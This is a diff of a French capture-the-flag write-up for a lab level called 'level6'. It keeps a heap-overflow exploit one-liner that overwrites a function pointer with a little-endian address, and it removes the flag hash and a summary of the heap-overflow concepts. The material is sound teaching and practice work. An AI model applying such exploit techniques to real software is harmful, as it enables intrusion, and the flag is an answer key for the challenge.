@@ -62,18 +62,3 @@ Little-endian de `0x08048454` → `\x54\x84\x04\x08`
 ```bash
 ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
 ```
-
-## Résultat
-
-```
-f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-```
-
-## Concepts à retenir
-
-- **Heap overflow** : débordement d'un buffer malloc vers le bloc malloc suivant.
-- **Pointeur de fonction** : une variable qui contient une adresse de fonction et
-  peut être appelée comme une fonction. Si on l'écrase, on redirige l'exécution.
-- **Header malloc (8B sur 32 bits)** : à ajouter au padding pour atteindre le bloc suivant.
-- **Différence avec level5** : pas de format string ici, l'adresse est injectée
-  directement en bytes via argv[1] avec `$(python -c '...')`.
